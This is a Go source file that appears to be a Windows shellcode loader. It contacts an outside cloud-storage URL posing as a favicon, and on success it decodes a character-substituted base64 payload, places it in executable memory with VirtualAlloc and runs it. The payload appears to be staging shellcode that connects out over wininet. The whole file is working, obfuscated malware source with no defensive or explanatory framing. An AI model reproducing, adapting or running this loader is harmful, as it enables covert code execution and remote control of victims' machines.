package main

import (
	"encoding/base64"
	"net/http"
	"net/url"
	"strings"
	"syscall"
	"unsafe"
)

func winrun(ddm string) {
	var (
		kernel32      = syscall.NewLazyDLL("kernel32.dll")
		VirtualAlloc  = kernel32.NewProc("VirtualAlloc")
		RtlMoveMemory = kernel32.NewProc("RtlMoveMemory")
	)
	str1 := strings.Replace(ddm, "#", "A", -1)
	str2 := strings.Replace(str1, "!", "H", -1)
	str3 := strings.Replace(str2, "@", "1", -1)
	str4 := strings.Replace(str3, ")", "T", -1)
	sDec, _ := base64.StdEncoding.DecodeString(str4)
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sDec)), 0x1000|0x2000, 0x40)
	_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sDec[0])), uintptr(len(sDec)))

	syscall.Syscall(addr, 0, 0, 0, 0)

}
func rev() {
	u, _ := url.Parse("http://wechatoss-api.oss-cn-beijing.aliyuncs.com/favicon.ico")
	q := u.Query()
	u.RawQuery = q.Encode()
	res, err := http.Get(u.String())
	if err != nil {
		return
	}
	resCode := res.StatusCode
	res.Body.Close()
	if err != nil {
		return
	}
	if resCode == 200 {
		winrun("/EiD5PDoy####EFRQVBSUVZIMdJlSItSYEiLUhhIi@IgSItyUEgPt0pK))!JSD!#rDxhf#IsIE!ByQ@B#c!i7VJBUUiLUiCLQjxI#dBmgXgYCwJ@cou#i####EiFw!RnS#!QUItIGESLQCBJ#dDjVkj/yUGLNIhI#dZNMclIMcCsQc!JDUEBw)jgdfFM#0wkCEU50XXYWESLQCRJ#dBmQYsMSESLQBxJ#dBBiwSIS#!QQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWo#Sb53aW5pbmV0#EFWSYnm)InxQbpMdyY!/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9Xpkw###FpIicFBuLsB##BNMclBUUFRagNBUUG6V4mfxv/V63lbSInBSD!SSYnY))!JUmg#MsCEUlJBuutVLjv/@UiJxkiDw@BqCl9IifG6!w###Go#aI#z##BJieBBuQQ###BBunVGnob/@UiJ8UiJ2kn!wP////9NMclSUkG6LQYYe//Vhc#PhZ0B##BI/88PhIwB##Drs+nk#Q##6IL///8vZjd)bQ#@)yFQJUBBUFs0XFBaWDU0KFBeK)dDQyk3fSRFSUNBUi@)VEFOREFSRC@B)lRJVklSVVMtVEV)VC@GSUxFISRIK0gq#DVPIV#l#FVzZXItQWdlbnQ6IE@vemlsbGEvNS4wIChjb2@wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVC#2LjE7IFdPVzY0OyBUcmlkZW50LzUuMDsgQk9JR)k7RU5DQSkNCg#@)yFQJUBBUFs0XFBaWDU0KFBeK)dDQyk3fSRFSUNBUi@)VEFOREFSRC@B)lRJVklSVVMtVEV)VC@GSUxFISRIK0gq#DVPIV#lQEFQWzRcUFpYN)QoUF4pN0NDK)d9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy@URVNULUZJ)EUhJEgrSCo#NU8hUCV#QVBbNFxQWlg@NChQXik3Q0MpN30kRUlDQVItU@RB)kRBUkQtQU5USVZJUlV)LVRFU@QtRklMRSEkSCtIKg#@)wBBvvC@olb/@Ugxybo##E##Qbg#E###Qbl#####QbpYpFPl/9VIk@N)SInnSInxSInaQbg#I###SYn5QboSloni/9VIg8QghcB0tmaLB0gBw4X#dddYWFhIBQ####BQw+h//f//NDcuO)UuM)E2LjY3#######=")
	}
}
